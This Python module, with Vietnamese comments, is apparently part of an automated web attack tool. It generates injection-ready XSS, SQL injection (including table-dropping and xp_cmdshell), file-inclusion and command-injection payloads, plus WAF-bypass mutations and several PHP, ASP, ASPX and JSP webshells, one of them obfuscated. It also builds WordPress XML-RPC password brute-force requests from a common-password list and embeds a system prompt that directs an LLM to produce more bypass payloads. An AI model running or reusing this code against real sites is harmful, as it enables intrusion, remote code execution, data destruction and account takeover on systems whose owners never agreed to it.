"""
ai/payload_gen.py - AI Payload Generator
Tạo payload: XSS, SQLi, File Upload Bypass, LFI
Mutate payload để bypass WAF
"""

import logging
import base64
import json
import urllib.request
import urllib.error
from typing import Dict, List
import config
logger = logging.getLogger("recon.payload_gen")

# ─── GROQ PROMPT: Payload Generation ──────────────────────────────────────────
# Prompt này được dùng trong generate_for_category() để sinh thêm payload
# bypass WAF dựa trên context thực tế của target.
# Model: llama3-70b-8192 | Temperature: 0.4 | Max tokens: 800
_PAYLOAD_GEN_SYSTEM = """You are an expert penetration tester specializing in web application vulnerability exploitation and WAF bypass techniques.

Your task: generate targeted attack payloads for a specific vulnerability type.

STRICT OUTPUT RULES:
- Respond ONLY with a valid JSON array of strings
- No explanation, no markdown, no ```json fences, no extra text
- Each payload must be ready to inject directly — no placeholders
- Maximum 15 payloads per response
- Do not duplicate payloads that already exist in existing_sample

Example valid output: ["payload1", "payload2", "payload3"]

WAF BYPASS RULES by bypass_mode:
- NONE: standard payloads, no special bypass
- ENCODE: URL-encode special chars (%3C%3E%22%27%3B%28%29)
- CASE_MANGLE: mix upper/lower case — ScRiPt, aLeRt, SeLeCt, UnIoN
- FRAGMENT: split keywords with comments — un/**/ion, se/**/lect, sc/**/ript
- SLOW: minimal single-token payloads only, no chaining

PAYLOAD RULES by vuln_type:
xss:
  - Use diverse event handlers: onerror, onload, onfocus, onmouseover, oninput, onblur
  - Use diverse tags: img, svg, iframe, details, video, marquee, input, body
  - Include attribute injection: "><payload, '><payload
  - Include javascript: URI and data: URI variants
  - Apply bypass_mode to all generated payloads

sqli:
  - Include time-based blind: SLEEP(5), WAITFOR DELAY, BENCHMARK
  - Include UNION-based: NULL column probing with 1,2,3 columns
  - Include boolean-based: AND 1=1, AND 1=2
  - Use comment variations: --, #, /**/, /*!*/
  - Apply bypass_mode encoding to keywords

rce:
  - Include command separators: ; | && || newline
  - Include backtick and $() substitution
  - Include /bin/sh, /usr/bin/curl, /bin/bash variants
  - Include OOB detection with curl/ping (use OOBHOST as placeholder)

lfi:
  - Include null byte: %00
  - Include path traversal variations: ../ %2F %252F ....//
  - Include PHP wrappers: php://filter, php://input, data://
  - Include /proc/self/environ /proc/self/fd

file_upload:
  - Extension bypass: .php, .php5, .phtml, .pHp, .php%00.jpg
  - Double extension: shell.jpg.php, shell.php.jpg
  - MIME bypass filenames"""

# ─── BASE PAYLOADS ─────────────────────────────────────────────────────────────

XSS_BASE = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "';alert(1)//",
    "\";alert(1)//",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<%2Fscript><%73cript>alert(1)<%2F%73cript>",
    "<Script>alert(1)</Script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
]

SQLI_BASE = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; DROP TABLE users--",
    "' OR 'unusual'='unusual",
    "admin'--",
    "' OR 1=1 LIMIT 1--",
    "1' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
]

LFI_BASE = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/%5C../%5C../%5C../%5C../etc/passwd",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "zip://shell.jpg%23shell.php",
    "/var/log/apache2/access.log",
    "../../../../var/www/html/config.php",
]

UPLOAD_BYPASS = {
    "double_extension": [
        "shell.php.jpg",
        "shell.php.png",
        "shell.php.gif",
        "shell.php%00.jpg",
        "shell.phtml",
        "shell.pHp",
        "shell.php5",
        "shell.php4",
        "shell.php3",
        "shell.shtml",
    ],
    "content_type": [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/octet-stream",
        "text/plain",
    ],
    "magic_bytes": {
        "gif": b"GIF89a",
        "jpeg": b"\xff\xd8\xff",
        "png": b"\x89PNG\r\n\x1a\n",
    },
    "webshell_content": [
        "<?php system($_GET['cmd']); ?>",
        "<?php passthru($_REQUEST['cmd']); ?>",
        "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
        "<?php $_=base64_decode('c3lzdGVt');$_($_GET['cmd']); ?>",  # obfuscated system()
        "<?php eval(base64_decode($_POST['cmd'])); ?>",
        "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    ]
}

RCE_PAYLOADS = [
    "; id",
    "| id",
    "` id`",
    "$(id)",
    "; cat /etc/passwd",
    "| whoami",
    "; ls -la",
    "` ls`",
    "& whoami &",
    "|| whoami",
    "&& whoami",
    "\nwhoami",
    ";a=i;b=d;$a$b",  # bypass filters
]

XMLRPC_PAYLOADS = {
    "check_methods": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>""",

    "bruteforce_template": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>""",

    "multicall_brute": """<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
{calls}
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>""",
}


class PayloadGenerator:
    """AI-enhanced payload generation with WAF bypass mutations"""

    def __init__(self, ai_client=None):
        # ai_client là groq_key (string) được pass từ agent.py
        self.ai_client = ai_client
        self._groq_key = ai_client if isinstance(ai_client, str) and len(ai_client) > 10 else None
        self._groq_model = config.PRIMARY_AI_MODEL
        self.waf_bypass_cache = {}
        # WAF context được set từ agent sau _ai_decide()
        self.waf_context = {"waf_name": None, "bypass_mode": "NONE", "failed_patterns": []}

    def _call_groq_for_payloads(self, vuln_type: str, parameters: List[str]) -> List[str]:
        """Gọi Groq API để sinh payload thông minh. Trả về [] nếu lỗi."""
        if not self._groq_key:
            return []
        try:
            user_msg = json.dumps({
                "vuln_type": vuln_type,
                "parameters": parameters[:5],
                "waf_detected": self.waf_context.get("waf_name"),
                "bypass_mode": self.waf_context.get("bypass_mode", "NONE"),
                "failed_patterns": self.waf_context.get("failed_patterns", [])[:8],
                "existing_sample": []
            })
            payload = json.dumps({
                "model": self._groq_model,
                "messages": [
                    {"role": "system", "content": _PAYLOAD_GEN_SYSTEM},
                    {"role": "user", "content": user_msg}
                ],
                "max_tokens": 800,
                "temperature": 0.4
            }).encode("utf-8")
            req = urllib.request.Request(
                "https://api.groq.com/openai/v1/chat/completions",
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {self._groq_key}"
                }
            )
            with urllib.request.urlopen(req, timeout=12) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                raw = data["choices"][0]["message"]["content"].strip()
                # Strip markdown fences nếu có
                raw = raw.lstrip("```json").lstrip("```").rstrip("```").strip()
                result = json.loads(raw)
                if isinstance(result, list):
                    logger.info(f"[GROQ] Generated {len(result)} AI payloads for {vuln_type}")
                    return [str(p) for p in result if p]
        except Exception as e:
            logger.debug(f"[GROQ] Payload gen failed: {e}")
        return []

    def generate_xss(self, context: str = "html", count: int = 10) -> List[str]:
        """Generate XSS payloads for a given context"""
        base = XSS_BASE.copy()
        
        if context == "attribute":
            base = [
                "\" onmouseover=\"alert(1)",
                "' onmouseover='alert(1)",
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "\" onclick=\"alert(1)",
            ]
        elif context == "javascript":
            base = [
                "';alert(1)//",
                "\";alert(1)//",
                "\\u0027;alert(1)//",
                "</script><script>alert(1)</script>",
            ]
        elif context == "url":
            base = [
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
                "vbscript:alert(1)",
            ]

        # Apply mutations
        mutated = self._mutate_xss(base[:count])
        return (base + mutated)[:count * 2]

    def generate_sqli(self, db_type: str = "mysql", blind: bool = False) -> List[str]:
        """Generate SQL injection payloads adaptive to DB type"""
        payloads = []

        if db_type == "mysql":
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND SLEEP(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "1' ORDER BY 1--",
                "1' UNION SELECT database()--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
            ]
        elif db_type == "postgres":
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND pg_sleep(5)--",
                "1' ORDER BY 1--",
                "1' UNION SELECT version()--",
                "1' UNION SELECT table_name FROM information_schema.tables--",
                "' AND (SELECT pg_sleep(5))--",
            ]
        elif db_type == "mssql":
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND 1=CONVERT(int,@@version)--",
                "1' ORDER BY 1--",
                "1' UNION SELECT @@version--",
                "1' UNION SELECT name FROM sys.databases--",
                "'; EXEC xp_cmdshell('whoami')--",
            ]
        elif db_type == "oracle":
            payloads = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL FROM DUAL--",
                "' UNION SELECT NULL,NULL FROM DUAL--",
                "' AND 1=1--",
                "1' ORDER BY 1--",
                "1' UNION SELECT banner FROM v$version--",
                "1' UNION SELECT table_name FROM all_tables--",
                "' AND (SELECT COUNT(*) FROM all_users WHERE rownum=1 AND (SELECT COUNT(*) FROM all_users WHERE rownum=1))>0--",
            ]
        else:
            payloads = SQLI_BASE.copy()

        if blind:
            payloads = [p for p in payloads if "sleep" in p.lower() or "pg_sleep" in p.lower() or "benchmark" in p.lower()]

        # Mutate for WAF bypass
        mutated = self._mutate_sqli(payloads)
        return payloads + mutated

    def generate_rce(self, context: str = "linux") -> List[str]:
        """Generate RCE payloads"""
        return RCE_PAYLOADS.copy()

    def _mutate_sqli(self, payloads: List[str]) -> List[str]:
        """Apply WAF bypass mutations to SQLi payloads"""
        mutated = []
        mutations = [
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace(" ", "%20"),
            lambda p: p.replace(" ", "%0a"),
            lambda p: p.replace("'", "%27"),
            lambda p: p.replace("'", "''"),
            lambda p: p.replace("OR", "oR"),
            lambda p: p.replace("UNION", "uNiOn"),
            lambda p: p.replace("SELECT", "sElEcT"),
            lambda p: p.replace("AND", "aNd"),
            lambda p: p.replace("OR", "oR"),
        ]
        for p in payloads:
            for mut in mutations:
                mutated.append(mut(p))
        return list(set(mutated))[:20]  # Limit

    def _mutate_xss(self, payloads: List[str]) -> List[str]:
        """Apply WAF bypass mutations to XSS payloads"""
        mutated = []
        mutations = [
            lambda p: p.replace("<script>", "<scr<script>ipt>"),
            lambda p: p.replace("</script>", "</scr</script>ipt>"),
            lambda p: p.replace("alert", "al\\u0065rt"),
            lambda p: p.replace("alert", "window['alert']"),
            lambda p: p.replace("alert", "top['alert']"),
            lambda p: p.replace("script", "ScRiPt"),
            lambda p: p.replace("onerror", "onError"),
            lambda p: p.replace("onload", "onLoad"),
        ]
        for p in payloads:
            for mut in mutations:
                mutated.append(mut(p))
        return list(set(mutated))[:20]

    def generate_lfi(self, os_type: str = "linux") -> List[str]:
        """Generate LFI payloads"""
        payloads = LFI_BASE.copy()

        if os_type == "windows":
            payloads.extend([
                "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
                "../../../../boot.ini",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ])

        return payloads

    def generate_upload_bypass(self, technique: str = "all") -> Dict:
        """Generate file upload bypass payloads"""
        if technique == "all":
            return UPLOAD_BYPASS
        return {technique: UPLOAD_BYPASS.get(technique, [])}

    def generate_webshell(self, language: str = "php", obfuscate: bool = False) -> str:
        """Generate a webshell"""
        shells = {
            "php": "<?php system($_GET['cmd']); ?>",
            "php_obf": "<?php $_=base64_decode('c3lzdGVt');$_($_GET['cmd']); ?>",
            "asp": "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"cmd\")).StdOut.ReadAll()) %>",
            "aspx": "<%@ Page Language=\"C#\"%><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo(\"cmd\",\"/c \"+Request[\"c\"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start()?new System.IO.StreamReader(System.Diagnostics.Process.GetCurrentProcess().StandardOutput.BaseStream).ReadToEnd():\"ERROR\");%>",
            "jsp": "<%@page import=\"java.io.*\"%><%=new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()%>",
        }

        if obfuscate and language == "php":
            return shells["php_obf"]
        return shells.get(language, shells["php"])

    def generate_for_category(self, category: str, parameters: List[str] = None) -> List[Dict]:
        """Generate payloads for a specific vulnerability category"""
        if parameters is None:
            parameters = []

        payloads = []

        if category.lower() == "xss":
            strings = self.generate_xss(count=10)
        elif category.lower() == "sqli" or category.lower() == "sql_injection":
            strings = self.generate_sqli()
        elif category.lower() == "rce" or category.lower() == "command_injection":
            strings = self.generate_rce()
        elif category.lower() == "lfi" or category.lower() == "file_inclusion":
            strings = self.generate_lfi()
        elif category.lower() == "file_upload":
            strings = [self.generate_webshell()]
        else:
            strings = self.generate_xss(count=5)

        # Bổ sung payload thông minh từ Groq nếu có key
        ai_payloads = self._call_groq_for_payloads(category, parameters)
        if ai_payloads:
            existing = set(strings)
            strings = strings + [p for p in ai_payloads if p not in existing]

        # Convert to dict format expected by scanner
        for payload_str in strings:
            payloads.append({
                "value": payload_str,
                "method": "GET",
                "params": {}
            })

        return payloads

    def generate_xmlrpc_brute(self, username: str, passwords: List[str]) -> List[str]:
        """Generate XML-RPC bruteforce payloads"""
        payloads = []
        for password in passwords:
            payload = XMLRPC_PAYLOADS["bruteforce_template"].format(
                username=username,
                password=password
            )
            payloads.append(payload)
        return payloads

    def generate_xmlrpc_multicall(self, username: str, passwords: List[str]) -> str:
        """Generate XML-RPC multicall payload (tests many passwords at once)"""
        call_template = """            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>{username}</string></value>
                        <value><string>{password}</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>"""

        calls = "\n".join(
            call_template.format(username=username, password=pwd)
            for pwd in passwords[:100]  # Max 100 per multicall
        )

        return XMLRPC_PAYLOADS["multicall_brute"].format(calls=calls)

    def mutate_for_waf_bypass(self, payload: str, payload_type: str) -> List[str]:
        """Generate WAF bypass variants of a payload"""
        mutations = [payload]

        if payload_type == "sqli":
            mutations.extend([
                payload.replace(" ", "/**/"),          # Comment bypass
                payload.replace(" ", "%09"),            # Tab instead of space
                payload.replace("OR", "||"),            # Alternative operators
                payload.replace("AND", "&&"),
                payload.replace("UNION", "UN/**/ION"),  # Break keywords
                payload.replace("SELECT", "SEL/**/ECT"),
                payload.upper(),
                payload.lower(),
                payload.replace("'", "0x27"),           # Hex encoding
            ])
        elif payload_type == "xss":
            mutations.extend([
                payload.replace("alert", "confirm"),
                payload.replace("alert", "prompt"),
                payload.replace("<script>", "<script/x>"),
                base64.b64encode(payload.encode()).decode(),
            ])
        elif payload_type == "lfi":
            mutations.extend([
                payload.replace("../", "....//"),
                payload.replace("../", "%2e%2e%2f"),
                payload.replace("../", "%2e%2e/"),
                payload.replace("/", "\\"),
            ])

        return list(set(mutations))

    def get_common_passwords(self) -> List[str]:
        """Return a wordlist for password bruteforcing"""
        return [
            "admin", "admin123", "password", "123456", "password123",
            "admin@123", "1234567890", "qwerty", "abc123", "111111",
            "iloveyou", "sunshine", "princess", "dragon", "master",
            "123456789", "letmein", "monkey", "shadow", "superman",
            "michael", "football", "baseball", "welcome", "login",
            "pass123", "root", "toor", "test", "guest", "demo",
            "administrator", "changeme", "default", "secret", "1q2w3e4r",
        ]